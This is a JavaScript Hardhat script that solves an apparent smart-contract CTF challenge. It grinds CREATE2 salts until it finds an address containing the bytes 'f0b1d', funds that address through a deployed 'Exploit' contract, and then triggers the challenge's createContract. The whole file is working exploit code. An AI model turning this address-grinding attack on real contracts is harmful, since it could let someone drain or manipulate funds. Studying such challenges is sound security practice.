const { ethers } = require("ethers");

const main = async () => {

    // console.log(await hre.ethers.provider.getStorageAt("0xF75009798C1fBe19776BDe76d03c619BF6e4eFF2",0))


    const challengeAddress = "0xF75009798C1fBe19776BDe76d03c619BF6e4eFF2"
    const challenge = await hre.ethers.getContractAt("Challenge", challengeAddress)

    const factoryAddress = "0xA4402Bf8Bd4d5825e66012D0e9175F8F76A0e811"
    const DummyFactory = await hre.ethers.getContractFactory("Dummy")
    const dummyBytecode = DummyFactory.bytecode

    // const ExploitFactory = await hre.ethers.getContractFactory("Exploit")
    // const exploit = await ExploitFactory.deploy()
    // await exploit.deployed()
    // console.log("exploit deployed at", exploit.address)

    const exploitAdress = "0x5f6104666208e5AA214A9e4164f9395B9B4AD8F0"
    const exploit = await hre.ethers.getContractAt("Exploit", exploitAdress)
   
    let randomSalt;
    let generatedAddress;
    let goodSalt;
    const neededBytes = "f0b1d" //bytes needed to be in the last 15 bytes of the address


    //generate address using the create2 opcode
    const generateAddress = (salt) => ethers.utils.getCreate2Address(factoryAddress, salt, ethers.utils.keccak256(dummyBytecode))

    const checkIfEOA = async (address) => {
      if(await hre.ethers.provider.getCode(address) == '0x'){
        console.log('good address because EOA')
       return true
      }
    }

    for (var i = 0; i < 1000000; i++) {
      randomSalt = ethers.utils.hexZeroPad(ethers.utils.hexlify(i), 32)
      generatedAddress = generateAddress(randomSalt)
      generatedAddress = ethers.utils.hexDataSlice(generatedAddress,0,20)
      if(generatedAddress.substring(10, 41).includes(neededBytes)){
        goodSalt = i
        if(await checkIfEOA(generatedAddress)){
          break
        }
      }
    }

    console.log("goodSalt", goodSalt)
    console.log(generatedAddress)

    //good salt: 930675
    const tx = await exploit.transferFunds(generatedAddress, {value: ethers.utils.parseEther("0.01")})
    await tx.wait(1)
    console.log("transfered done")

    await challenge.createContract(dummyBytecode, goodSalt)

    console.log("created contract")
    
}




main()
.then(() => process.exit(0))
.catch((error) => {
  console.error(error);
  process.exit(1);
});